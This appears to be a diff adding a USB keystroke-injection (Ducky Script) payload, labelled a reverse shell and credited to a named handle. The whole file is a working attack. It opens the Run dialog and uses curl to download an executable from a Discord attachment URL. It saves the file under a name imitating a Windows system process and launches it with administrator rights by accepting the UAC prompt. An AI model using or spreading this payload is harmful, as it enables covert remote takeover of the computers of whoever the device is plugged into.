@@ -1,0 +1,19 @@
+REM --- Reverse shell script using CMD to connect to host (WITHOUT DEFENDER KILLER)
+REM --- Made by Zebratic#6969
+
+REM --- STARTUP DELAY
+DELAY 500
+
+
+REM --- DOWNLOAD AND RUN PAYLOAD
+GUI r
+DELAY 50
+STRING curl https://cdn.discordapp.com/attachments/869675809466626058/887997205166825483/NeroNet.exe -O %temp%\crsss.exe
+ENTER
+DELAY 1500
+GUI r
+DELAY 50
+STRING %temp%\crsss.exe
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
